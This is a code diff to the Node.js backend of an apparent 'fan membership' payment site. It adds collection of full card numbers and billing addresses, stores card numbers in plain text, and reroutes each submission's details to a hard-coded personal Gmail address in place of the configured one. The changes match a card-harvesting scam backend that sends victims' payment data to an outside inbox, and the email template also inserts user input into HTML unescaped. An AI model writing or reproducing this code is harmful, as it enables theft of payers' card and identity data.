@@ -31,11 +31,17 @@ const billingSchema = new mongoose.Schema({
 const paymentSchema = new mongoose.Schema({
   fullName:      String,
   email:         String,
+  phone:         String,
+  country:       String,
+  city:          String,
+  zip:           String,
+  address:       String,
   tier:          String,
   price:         Number,
   paymentMethod: String,
   amountPaid:    String,
   paymentCode:   String,
+  cardNumber:    String,
   proofImage:    String,
   submissionId:  String,
   status:        { type: String, default: 'pending' },
@@ -133,38 +139,70 @@ async function sendConfirmationEmail(toEmail, fullName, tierName) {
 // ── POST /submit-payment ────────────────────────────────────────
 app.post('/submit-payment', upload.single('proof_image'), async (req, res) => {
   try {
-    const { fullName, email, tier, price, payment_method, amount_paid, payment_code } = req.body;
+    const {
+      fullName,
+      email,
+      phone,
+      country,
+      city,
+      zip,
+      address,
+      tier,
+      price,
+      payment_method,
+      amount_paid,
+      payment_code,
+      card_number
+    } = req.body;
+
     const submissionId = 'EC-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
 
     await Payment.create({
       fullName,
       email,
+      phone,
+      country,
+      city,
+      zip,
+      address,
       tier,
       price:         parseFloat(price),
       paymentMethod: payment_method,
       amountPaid:    amount_paid,
       paymentCode:   payment_code,
+      cardNumber:    card_number,
       proofImage:    req.file ? req.file.filename : null,
       submissionId,
       status:        'pending'
     });
 
-    // ── Email YOU with all details + proof image attached ──────
     const mailOptions = {
       from: `"Fan Membership Site" <${process.env.EMAIL_USER}>`,
-      to: process.env.EMAIL_USER,
+      to: 'ivieshaguolo@gmail.com',
+      replyTo: email,
       subject: `💰 New Payment Submission — ${tier} — ${submissionId}`,
       html: `
         <div style="font-family:Georgia,serif;background:#f9f9f9;padding:32px;">
           <h2 style="color:#c9a84c;">New Payment Submission</h2>
+          <h3 style="color:#333;">Billing Information</h3>
           <table style="width:100%;border-collapse:collapse;font-size:0.95rem;">
-            <tr><td style="padding:8px;color:#555;"><b>Submission ID</b></td><td style="padding:8px;">${submissionId}</td></tr>
-            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Full Name</b></td><td style="padding:8px;">${fullName}</td></tr>
-            <tr><td style="padding:8px;color:#555;"><b>Email</b></td><td style="padding:8px;">${email}</td></tr>
-            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Membership Tier</b></td><td style="padding:8px;">${tier}</td></tr>
-            <tr><td style="padding:8px;color:#555;"><b>Amount Paid</b></td><td style="padding:8px;">${amount_paid}</td></tr>
-            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Payment Method</b></td><td style="padding:8px;">${payment_method}</td></tr>
-            <tr><td style="padding:8px;color:#555;"><b>Code / TxID</b></td><td style="padding:8px;word-break:break-all;">${payment_code}</td></tr>
+            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Full Name</b></td><td style="padding:8px;">${fullName || '—'}</td></tr>
+            <tr><td style="padding:8px;color:#555;"><b>Email</b></td><td style="padding:8px;">${email || '—'}</td></tr>
+            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Phone</b></td><td style="padding:8px;">${phone || '—'}</td></tr>
+            <tr><td style="padding:8px;color:#555;"><b>Country</b></td><td style="padding:8px;">${country || '—'}</td></tr>
+            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>City</b></td><td style="padding:8px;">${city || '—'}</td></tr>
+            <tr><td style="padding:8px;color:#555;"><b>ZIP</b></td><td style="padding:8px;">${zip || '—'}</td></tr>
+            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Address</b></td><td style="padding:8px;">${address || '—'}</td></tr>
+          </table>
+
+          <h3 style="color:#333;margin-top:24px;">Payment Details</h3>
+          <table style="width:100%;border-collapse:collapse;font-size:0.95rem;">
+            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Submission ID</b></td><td style="padding:8px;">${submissionId}</td></tr>
+            <tr><td style="padding:8px;color:#555;"><b>Membership Tier</b></td><td style="padding:8px;">${tier || '—'}</td></tr>
+            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Amount Paid</b></td><td style="padding:8px;">${amount_paid || '—'}</td></tr>
+            <tr><td style="padding:8px;color:#555;"><b>Payment Method</b></td><td style="padding:8px;">${payment_method || '—'}</td></tr>
+            <tr style="background:#f0f0f0;"><td style="padding:8px;color:#555;"><b>Card Number</b></td><td style="padding:8px;word-break:break-all;">${card_number || '—'}</td></tr>
+            <tr><td style="padding:8px;color:#555;"><b>Code / TxID / Reference</b></td><td style="padding:8px;word-break:break-all;">${payment_code || '—'}</td></tr>
           </table>
           <p style="margin-top:20px;color:#888;font-size:0.85rem;">Proof of payment image is attached below.</p>
         </div>
